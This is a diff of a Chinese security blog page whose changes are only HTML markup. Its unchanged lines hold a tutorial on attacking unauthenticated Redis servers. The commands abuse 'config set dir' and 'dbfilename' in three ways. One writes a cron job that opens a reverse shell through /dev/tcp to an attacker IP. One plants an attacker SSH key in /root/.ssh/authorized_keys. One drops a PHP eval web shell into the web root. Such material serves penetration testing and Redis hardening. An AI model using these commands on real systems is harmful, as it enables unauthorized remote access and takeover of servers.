@@ -110,14 +110,14 @@
 <h2 id="0x03-利用方法">0x03 利用方法</h2>
 <h3 id="1-利用-cron-定时任务反弹-shell">1. 利用 Cron 定时任务反弹 shell</h3>
 <blockquote>
-<p>关于 Linux Cron 定时任务见另一篇博客 [<a href="https://x5tar.com/2020/06/21/linux-crontab/" rel="noopener noreffer" target="_blank">Linux Cron 定时任务</a>](<a href="https://x5tar.com/2020/06/21/linux-crontab/">https://x5tar.com/2020/06/21/linux-crontab/</a>)</p>
+<p>关于 Linux Cron 定时任务见另一篇博客 [<a href="https://x5tar.com/2020/06/21/linux-crontab/" rel="noopener noreffer" target="_blank">Linux Cron 定时任务</a>](<a href="https://x5tar.com/2020/06/21/linux-crontab/" rel="noopener noreffer" target="_blank">https://x5tar.com/2020/06/21/linux-crontab/</a>)</p>
 <p><strong>本方法适用于目标机器以 root 身份启动 Redis 的情况</strong></p>
 </blockquote>
 <p>先在攻击机上监听任意端口 <code>nc -lvvp Port</code></p>
 <p>然后在连接的 redis-cli 执行以下命令（第一行命令可以换为其它任何可以反弹 shell 的命令）</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre class="chroma" tabindex="0"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span><span class="lnt">4
@@ -127,7 +127,7 @@
 </span><span class="lnt">8
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-fallback" data-lang="fallback">&gt; set x "\n* * * * * bash -i &gt;&amp; /dev/tcp/攻击机IP/Port 0&gt;&amp;1\n"
+<pre class="chroma" tabindex="0"><code class="language-fallback" data-lang="fallback">&gt; set x "\n* * * * * bash -i &gt;&amp; /dev/tcp/攻击机IP/Port 0&gt;&amp;1\n"
 OK
 &gt; config set dir /var/spool/cron/
 OK
@@ -147,25 +147,25 @@ OK
 <p>先在攻击机生成 ssh 公钥（已存在公钥无需重复生成，防止覆盖）</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre class="chroma" tabindex="0"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-fallback" data-lang="fallback">ssh-keygen -t rsa
+<pre class="chroma" tabindex="0"><code class="language-fallback" data-lang="fallback">ssh-keygen -t rsa
 </code></pre></td></tr></table>
 </div>
 </div><p>然后在 <code>~/.ssh</code> 目录下执行以下命令</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre class="chroma" tabindex="0"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-fallback" data-lang="fallback">(echo -e "\n\n"; cat id_rsa.pub; echo -e "\n\n") | redis-cli -h 目标机器IP -x set x
+<pre class="chroma" tabindex="0"><code class="language-fallback" data-lang="fallback">(echo -e "\n\n"; cat id_rsa.pub; echo -e "\n\n") | redis-cli -h 目标机器IP -x set x
 </code></pre></td></tr></table>
 </div>
 </div><p>然后在连接的 redis-cli 执行以下命令（此处假设用户为 root，home 目录为 <code>/home</code>）</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre class="chroma" tabindex="0"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span><span class="lnt">4
@@ -173,7 +173,7 @@ OK
 </span><span class="lnt">6
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-fallback" data-lang="fallback">&gt; config set dir /root/.ssh
+<pre class="chroma" tabindex="0"><code class="language-fallback" data-lang="fallback">&gt; config set dir /root/.ssh
 OK
 &gt; config set dbfilename authorized_keys
 OK
@@ -190,7 +190,7 @@ OK
 <p>在连接的 redis-cli 执行以下命令（此处假设目标机器运行 PHP）</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre class="chroma" tabindex="0"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span><span class="lnt">4
@@ -200,7 +200,7 @@ OK
 </span><span class="lnt">8
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-fallback" data-lang="fallback">&gt; set x "\n&lt;?php eval($_POST['cmd']); ?&gt;\n"
+<pre class="chroma" tabindex="0"><code class="language-fallback" data-lang="fallback">&gt; set x "\n&lt;?php eval($_POST['cmd']); ?&gt;\n"
 OK
 &gt; config set dir /var/www/html
 OK
@@ -218,11 +218,11 @@ OK
 <p>从 Redis 2.6.0 版本开始，Redis 内置了 lua 解释器，可以通过 lua 脚本进行一些操作</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre class="chroma" tabindex="0"><code><span class="lnt">1
 </span><span class="lnt">2
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-fallback" data-lang="fallback">&gt; eval "return 'hello'" 0
+<pre class="chroma" tabindex="0"><code class="language-fallback" data-lang="fallback">&gt; eval "return 'hello'" 0
 "hello"
 </code></pre></td></tr></table>
 </div>
@@ -277,7 +277,7 @@ OK
                 Please enable JavaScript to view the comments powered by <a href="https://valine.js.org/">Valine</a>.
             </noscript></div></article></div>
 </main><footer class="footer">
-<div class="footer-container"><div class="footer-line">由 <a href="https://gohugo.io/" rel="noopener noreffer" target="_blank" title="Hugo 0.85.0">Hugo</a> 强力驱动 | 主题 - <a href="https://github.com/dillonzq/LoveIt" rel="noopener noreffer" target="_blank" title="LoveIt 0.2.10"><i class="far fa-kiss-wink-heart fa-fw"></i> LoveIt</a>
+<div class="footer-container"><div class="footer-line">由 <a href="https://gohugo.io/" rel="noopener noreffer" target="_blank" title="Hugo 0.87.0">Hugo</a> 强力驱动 | 主题 - <a href="https://github.com/dillonzq/LoveIt" rel="noopener noreffer" target="_blank" title="LoveIt 0.2.10"><i class="far fa-kiss-wink-heart fa-fw"></i> LoveIt</a>
 </div><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2021</span><span class="author" itemprop="copyrightHolder"> <a href="/" target="_blank">X5tar</a></span> | <span class="license"><a href="https://creativecommons.org/licenses/by-sa/4.0/" rel="license external nofollow noopener noreffer" target="_blank">CC BY-SA 4.0</a></span></div>
 </div>
 </footer></div>
